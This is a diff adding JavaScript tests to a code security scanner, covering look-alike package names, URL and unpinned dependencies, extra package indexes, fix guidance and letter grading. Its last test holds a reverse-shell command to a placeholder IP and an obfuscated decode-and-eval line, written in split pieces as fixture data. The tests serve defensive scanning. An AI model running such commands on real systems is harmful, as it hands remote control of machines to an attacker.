@@ -174,3 +174,42 @@ test("hostile input can't freeze the scanner (no catastrophic backtracking)", ()
     assert.ok(Date.now() - t < 1500, `took ${Date.now() - t}ms on ${JSON.stringify(line.slice(0, 20))}…`);
   }
 });
+
+test("supply chain: look-alike packages, URL dependencies, extra indexes, unpinned versions", () => {
+  const pkg = deps => JSON.stringify({ name: "x", version: "1.0.0", scripts: { build: "tsc -p ." }, dependencies: deps, devDependencies: { tyepscript: "^5.0.0" } }, null, 2);
+  const found = text => g.scan(text, "package.json").map(f => `${f.rule}:${f.line}`);
+  assert.deepEqual(found(pkg({ expres: "^4.18.2", react: "^18.2.0", preact: "^10.0.0", color: "^4.2.3" })), ["typosquat-package:8", "typosquat-package:14"], "expres and tyepscript, not react/preact/color");
+  assert.deepEqual(found(pkg({ mylib: "git+https://github.com/a/b.git", other: "https://example.com/x.tgz" })), ["remote-dependency:8", "remote-dependency:9", "typosquat-package:12"]);
+  assert.deepEqual(found(pkg({ "left-pad": "*", chalk: "latest" })), ["unpinned-dependency:8", "unpinned-dependency:9", "typosquat-package:12"]);
+  assert.deepEqual(found(JSON.stringify({ name: "x", version: "1.0.0" }, null, 2)), [], "the package's own fields are not dependencies");
+  const req = t => g.scan(t, "requirements.txt").map(f => `${f.rule}:${f.line}`);
+  assert.deepEqual(req("reqeusts==2.31.0\nnumpy>=1.26\nboto==2.49\n"), ["typosquat-package:1"]);
+  assert.deepEqual(req("--extra-index-url https://pkgs.example.com/simple\nflask==3.0.0\n"), ["dependency-confusion:1"]);
+  assert.deepEqual(req("git+https://github.com/a/b.git#egg=b\n"), ["remote-dependency:1"]);
+  assert.equal(g.editDistance("express", "expres"), 1);
+  assert.equal(g.editDistance("typescript", "tyepscript"), 1, "a swap of two letters is one edit");
+});
+
+test("every finding says how to fix it", () => {
+  for (const r of g.ruleList()) assert.ok(r.fix && r.fix.length > 30, `${r.id} has fix guidance`);
+  const f = g.scan(j("ev", "al(at", "ob(x))"), "a.js")[0];
+  assert.match(f.fix, /Replace eval/);
+});
+
+test("grade: score, letter and verdict", () => {
+  const sev = s => ({ severity: s });
+  assert.deepEqual([g.grade([]).letter, g.grade([]).score], ["A", 100]);
+  assert.equal(g.grade([sev("low"), sev("low")]).letter, "A");
+  assert.equal(g.grade([sev("medium"), sev("medium"), sev("medium")]).letter, "B");
+  assert.equal(g.grade([sev("high")]).letter, "B");
+  assert.equal(g.grade([sev("critical")]).letter, "D", "one critical caps the grade at D");
+  assert.equal(g.grade([sev("critical"), sev("critical"), sev("high")]).letter, "F");
+  assert.match(g.grade([sev("critical")]).verdict, /Action needed/);
+});
+
+test("documentation is only checked for hidden characters and leaked keys", () => {
+  const doc = [j("| Reverse shells | `bash -i >& /dev/", "tcp/1.2.3.4/4444` |"), j("Example: `ev", "al(at", "ob(x))`")].join("\n");
+  assert.deepEqual(rules(doc, "docs/attacks.md"), []);
+  has(j("Note: ", "\u202E", " hidden"), "trojan-source", "README.md");
+  has(j("key: AKI", "AQ4XN7ZK2PB9RW3TY"), "secret", "notes.txt");
+});
